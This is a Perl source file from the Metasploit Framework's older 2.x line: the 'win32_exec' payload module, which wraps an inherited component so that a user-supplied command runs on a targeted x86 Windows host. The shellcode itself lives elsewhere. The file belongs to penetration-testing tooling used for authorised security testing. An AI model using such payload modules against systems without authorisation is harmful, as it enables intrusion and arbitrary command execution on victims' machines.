package Msf::Payload::win32_exec;
use strict;
use base 'Msf::PayloadComponent::Win32Execute';
sub load {
  Msf::PayloadComponent::Win32Execute->import('Msf::PayloadComponent::NoConnection');
}

my $info =
{
    'Name'         => 'winexec',
    'Version'      => '2.0',
    'Description'  => 'Execute an arbitrary command',
    'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Arch'         => [ 'x86' ],
    'Priv'         => 0,
    'OS'           => [ 'win32' ],
    'Multistage'   => 0,
    'Size'         => '',
    'UserOpts'     =>
        {
            'CMD' => [1, 'DATA', 'The command string to execute'],
        },
};

sub new {
    load();
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info}, @_);
    return($self);
}

sub Size {
    my $self = shift;
    $self->{WinExecCmd} = $self->GetVar('CMD');
    return $self->SUPER::Size($self);
}

sub Build {
    my $self = shift;
    $self->{WinExecCmd} = $self->GetVar('CMD');
    return $self->SUPER::Build($self);
}
